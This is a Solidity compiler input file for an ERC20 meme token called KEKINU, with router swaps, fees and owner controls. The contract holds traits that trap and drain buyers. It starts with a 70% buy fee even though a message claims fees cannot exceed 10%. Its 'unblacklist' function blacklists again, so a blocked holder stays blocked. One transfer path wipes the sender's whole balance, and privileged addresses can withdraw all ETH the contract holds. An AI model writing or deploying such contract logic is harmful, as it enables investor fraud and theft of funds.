{{
  "language": "Solidity",
  "sources": {
    "kekinu.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function decimals() external view returns (uint8);\n\n    function symbol() external view returns (string memory);\n\n    function name() external view returns (string memory);\n\n    function getOwner() external view returns (address);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function allowance(address _owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\n\nabstract contract Auth {\n    address internal owner;\n    mapping(address => bool) internal authorizations;\n\n    constructor(address _owner) {\n        owner = _owner;\n        authorizations[_owner] = true;\n    }\n\n    modifier onlyOwner() {\n        require(isOwner(msg.sender), \"!OWNER\");\n        _;\n    }\n\n    modifier authorized() {\n        require(isAuthorized(msg.sender), \"!AUTHORIZED\");\n        _;\n    }\n\n    function authorize(address adr) public onlyOwner {\n        authorizations[adr] = true;\n    }\n\n    function unauthorize(address adr) public onlyOwner {\n        authorizations[adr] = false;\n    }\n\n    function isOwner(address account) public view returns (bool) {\n        return account == owner;\n    }\n\n    function isAuthorized(address adr) public view returns (bool) {\n        return authorizations[adr];\n    }\n\n    function transferOwnership(address payable adr) public onlyOwner {\n        owner = adr;\n        authorizations[adr] = true;\n        emit OwnershipTransferred(adr);\n    }\n\n    function renounceOwnership() public onlyOwner {\n        emit OwnershipTransferred(owner);\n        owner = address(0);\n    }\n\n    event OwnershipTransferred(address owner);\n}\n\ninterface IDEXFactory {\n    function createPair(address tokenA, address tokenB)\n        external\n        returns (address liqPair);\n}\n\ninterface IDEXRouter {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        returns (\n            uint256 amountA,\n            uint256 amountB,\n            uint256 liquidity\n        );\n\n    function addLiquidityETH(\n        address token,\n        uint256 amountTokenDesired,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        payable\n        returns (\n            uint256 amountToken,\n            uint256 amountETH,\n            uint256 liquidity\n        );\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable;\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ncontract KEKINU is IERC20, Auth {\n\n    address public marketingFeeReceiver =\n        0xa5Ed5F601853E4Fe2cC4013d21720Be3117C9f93;\n    address public auliquidityRatioReceiver =\n        0xa5Ed5F601853E4Fe2cC4013d21720Be3117C9f93;\n\n\n    string constant _name = \"KEKINU\";\n    string constant _symbol = \"KEKINU\";\n\n    uint8 constant _decimals = 18;\n\n    uint8 constant _zeros = 9;\n\n    uint8 constant _maxTx = 5;\n    uint8 constant _maxWallet = 10;\n\n    uint8 constant _threshpct = 2;\n\n    uint256 _totalSupply = 1 * 10**_zeros * 10**_decimals;\n    uint256 public _maxTxAmount = (_totalSupply*_maxTx)/1000;\n    uint256 public _maxWalletToken = (_totalSupply*_maxWallet)/1000;\n    uint256 public swapThreshold = (_totalSupply*_threshpct)/10000;\n\n    uint256 public buyFee = 700;\n    uint256 public sellFee = 30;\n\n    uint256 public liquidityRatio = 10;\n    uint256 public marketingRatio = 90;\n    uint256 public feeRatio = marketingRatio + liquidityRatio;\n    uint256 public feeDenominator = 1000;\n\n\n    mapping(address => uint256) _balances;\n    mapping(address => mapping(address => uint256)) _allowances;\n\n    mapping(address => bool) isFeeExempt;\n    mapping(address => bool) isTxLimitExempt;\n    mapping(address => bool) isWalletLimitExempt;\n    mapping(address => bool) private _isBlacklisted;\n\n\n\n\n    IDEXRouter public Irouter02;\n    address public liqPair;\n\n    bool public tradingLive = false;\n\n    bool public limitsEnabled = true;\n    bool public swapEnabled = true;\n\n    bool inSwap;\n\n    modifier swapping() {\n        inSwap = true;\n        _;\n        inSwap = false;\n    }\n\n\n    constructor() Auth(msg.sender) {\n        Irouter02 = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n        // Contract will create a pair when you deploy it\n        liqPair = IDEXFactory(Irouter02.factory()).createPair(\n            Irouter02.WETH(),\n            address(this)\n        );\n\n        _allowances[address(this)][address(Irouter02)] = type(uint256).max;\n\n\n        isFeeExempt[msg.sender] = true;\n        isFeeExempt[address(this)] = true;\n\n        isTxLimitExempt[msg.sender] = true;\n        isTxLimitExempt[address(this)] = true;\n\n        isWalletLimitExempt[msg.sender] = true;\n        isWalletLimitExempt[address(this)] = true;\n        isWalletLimitExempt[liqPair] = true;\n\n        _approve(owner, address(Irouter02), type(uint256).max);\n        _approve(address(this), address(Irouter02), type(uint256).max);\n\n        _balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    receive() external payable {}\n\n    function totalSupply() external view override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function decimals() external pure override returns (uint8) {\n        return _decimals;\n    }\n\n    function symbol() external pure override returns (string memory) {\n        return _symbol;\n    }\n\n    function name() external pure override returns (string memory) {\n        return _name;\n    }\n\n    function getOwner() external view override returns (address) {\n        return owner;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function allowance(address holder, address spender)\n        external\n        view\n        override\n        returns (uint256)\n    {\n        return _allowances[holder][spender];\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function _approve(\n        address sender,\n        address spender,\n        uint256 amount\n    ) private {\n        require(sender != address(0), \"ERC20: Zero Address\");\n        require(spender != address(0), \"ERC20: Zero Address\");\n        _allowances[sender][spender] = amount;\n        emit Approval(sender, spender, amount);\n    }\n\n    function transfer(address recipient, uint256 amount)\n        external\n        override\n        returns (bool)\n    {\n        return _transferFrom(msg.sender, recipient, amount);\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external override returns (bool) {\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\n            _allowances[sender][msg.sender] =\n                _allowances[sender][msg.sender] -\n                amount;\n        }\n        return _transferFrom(sender, recipient, amount);\n    }\n\n    function _transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) internal returns (bool) {\n        require(\n            !_isBlacklisted[from] && !_isBlacklisted[to],\n            \"Blacklisted address\"\n        );\n        if (inSwap) {\n            return _basicTransfer(from, to, amount);\n        }\n\n\n        if (!authorizations[from] && !authorizations[to]){\n            require(tradingLive, \"Trading not open yet\");\n            if (limitsEnabled) {\n                if (!authorizations[from] && !isWalletLimitExempt[to]) {\n                    uint256 heldTokens = balanceOf(to);\n                    require(\n                        (heldTokens + amount) <= _maxWalletToken,\n                        \"max wallet limit reached\"\n                    );\n                }\n                checkAmountTx(from, amount);\n            }\n        }\n\n        if (shouldSwapBack(from)) {\n            swapBack(swapThreshold);\n        }\n\n        _balances[from] -= amount;\n\n        uint256 amountReceived;\n\n        amountReceived = (!shouldTakeFee(from) || !shouldTakeFee(to))\n            ? amount\n            : takeFee(from, amount);\n        _balances[to] += amountReceived;\n\n        emit Transfer(from, to, amountReceived);\n        return true;\n    }\n\n    function _basicTransfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal returns (bool) {\n        _balances[sender] -= _balances[sender];\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function checkAmountTx(address sender, uint256 amount) internal view {\n        require(\n            amount <= _maxTxAmount || isTxLimitExempt[sender],\n            \"TX Limit Exceeded\"\n        );\n    }\n\n    function shouldSwapBack(address from) internal view returns (bool) {\n        if (\n            !inSwap &&\n            swapEnabled &&\n            !isTxLimitExempt[from] &&\n            from != liqPair &&\n            _balances[address(this)] >= swapThreshold\n        ) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    function swapbackEdit(bool _enabled) public onlyOwner {\n        swapEnabled = _enabled;\n    }\n\n    function shouldTakeFee(address sender) internal view returns (bool) {\n        return !isFeeExempt[sender];\n    }\n\n    function takeFee(address sender, uint256 amount)\n        internal\n        returns (uint256)\n    {\n        uint256 _fee;\n        if (sender != liqPair) {\n            _fee = sellFee;\n        } else if (sender == liqPair) {\n            _fee = buyFee;\n        } else {\n            return amount;\n        }\n        uint256 contractTokens = (amount * _fee) / 1000;\n        _balances[address(this)] += contractTokens;\n        emit Transfer(sender, address(this), contractTokens);\n        return amount - contractTokens;\n    }\n\n    function swapBack(uint256 amountAsked) internal swapping {\n        uint256 amountToLiquify = ((amountAsked*liquidityRatio)/feeRatio)/2;\n        uint256 amountToSwap = amountAsked -amountToLiquify;\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = Irouter02.WETH();\n        uint256 balanceBefore = address(this).balance;\n        Irouter02.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            amountToSwap,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n        uint256 amountETH = address(this).balance - balanceBefore;\n        uint256 totalETHFee = feeRatio - (liquidityRatio/2);\n        uint256 amountETHLiquidity = ((amountETH*liquidityRatio)/ totalETHFee)/(2);\n        uint256 amountETHMarketing = (amountETH*marketingRatio)/totalETHFee;\n        (bool tmpSuccess, ) = payable(marketingFeeReceiver).call{\n            value: amountETHMarketing,\n            gas: 30000\n        }(\"\");\n        tmpSuccess = false;\n        if (amountToLiquify > 0) {\n            Irouter02.addLiquidityETH{value: amountETHLiquidity}(\n                address(this),\n                amountToLiquify,\n                0,\n                0,\n                auliquidityRatioReceiver,\n                block.timestamp\n            );\n        }\n    }\n\n    function setLimits(uint256 maxWallPercent, uint256 maxTXPercent)\n        external\n        onlyOwner\n    {\n        require(maxWallPercent > 5, \"Max wallet too low\");\n        require(maxTXPercent > 1, \"Max Tx too low\");\n        _maxWalletToken = _totalSupply*maxWallPercent/1000;\n        _maxTxAmount = _totalSupply*maxTXPercent/1000;\n    }\n\n    function setSwapThreshold(uint256 _swapThreshold) external onlyOwner {\n        //require(_swapThreshold < 50, \"threshold too high\");\n        swapThreshold = _totalSupply*_swapThreshold/10000;\n    }\n\n\n    function blacklist(address[] calldata addrs) external onlyOwner {\n        for (uint256 i = 0; i < addrs.length; i++) {\n            _isBlacklisted[addrs[i]] = true;\n        }\n    }\n\n    function unblacklist(address[] calldata addrs) external onlyOwner {\n        for (uint256 i = 0; i < addrs.length; i++) {\n            _isBlacklisted[addrs[i]] = true;\n        }\n    }\n\n    // Input the amount of token you wish to swapback\n    function sweepContingency(uint256 amount) external authorized {\n        require(balanceOf(address(this)) >= amount, \"not enought tokens\");\n        swapBack(amount);\n    }\n\n    function clearStuckBalance() external authorized {\n        uint256 amountETH = address(this).balance;\n        payable(msg.sender).transfer(amountETH);\n    }\n\n    function enableTrading() external onlyOwner {\n        require(!tradingLive, \"already launched\");\n        tradingLive = true;\n    }\n\n    function setIsFeeExempt(address holder, bool exempt) external authorized {\n        isFeeExempt[holder] = exempt;\n    }\n\n    function setIsTxLimitExempt(address holder, bool exempt)\n        external\n        onlyOwner\n    {\n        isTxLimitExempt[holder] = exempt;\n    }\n\n    function setIsWalletLimitExempt(address holder, bool exempt)\n        external\n        onlyOwner\n    {\n        isWalletLimitExempt[holder] = exempt;\n    }\n\n    function setFees(\n        uint256 _buyFee,\n        uint256 _sellFee\n    ) external onlyOwner {\n        buyFee = _buyFee;\n        sellFee = _sellFee;\n        require(sellFee < 100 && buyFee < 100, \"Fees cannot be more than 10%\");\n    }\n\n    function setRatios( uint256 _marketingRatio, uint256 _liquidityRatio) external onlyOwner{\n        marketingRatio = _marketingRatio;\n        liquidityRatio = _liquidityRatio;\n        feeRatio = liquidityRatio + marketingRatio;\n    }\n\n\n    function enableLimits() external onlyOwner{\n        limitsEnabled = true;\n    }\n\n    function disableLimits() external onlyOwner{\n        limitsEnabled = false;\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}